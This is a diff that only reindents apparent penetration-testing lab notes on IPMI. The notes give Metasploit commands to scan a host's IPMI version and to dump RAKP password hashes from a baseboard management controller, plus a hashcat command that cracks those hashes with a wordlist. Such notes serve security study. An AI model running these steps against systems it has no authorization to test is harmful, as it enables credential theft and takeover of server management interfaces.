@@ -1,8 +1,8 @@
 # Metasploit scanner module IPMI Information Discovery (auxiliary/scanner/ipmi/ipmi_version)
-msf6 > use auxiliary/scanner/ipmi/ipmi_version 
-msf6 auxiliary(scanner/ipmi/ipmi_version) > set rhosts 10.129.42.195
-msf6 auxiliary(scanner/ipmi/ipmi_version) > show options 
-msf6 auxiliary(scanner/ipmi/ipmi_version) > run
+  msf6 > use auxiliary/scanner/ipmi/ipmi_version 
+  msf6 auxiliary(scanner/ipmi/ipmi_version) > set rhosts 10.129.42.195
+  msf6 auxiliary(scanner/ipmi/ipmi_version) > show options 
+  msf6 auxiliary(scanner/ipmi/ipmi_version) > run
 
 # If default credentials do not work to access a BMC, we can turn to a flaw
 # in the RAKP protocol in IPMI 2.0. During the authentication process,
@@ -16,7 +16,7 @@ msf6 auxiliary(scanner/ipmi/ipmi_version) > run
 # hashcat -m 7300 -w 3 -O ipmi.txt /usr/share/wordlists/rockyou.txt
 
 # To retrieve IPMI hashes, we can use the Metasploit IPMI 2.0 RAKP Remote SHA1 Password Hash Retrieval module. 
-msf6 > use auxiliary/scanner/ipmi/ipmi_dumphashes 
-msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > set rhosts 10.129.42.195
-msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > show options 
-msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > run
+  msf6 > use auxiliary/scanner/ipmi/ipmi_dumphashes 
+  msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > set rhosts 10.129.42.195
+  msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > show options 
+  msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > run
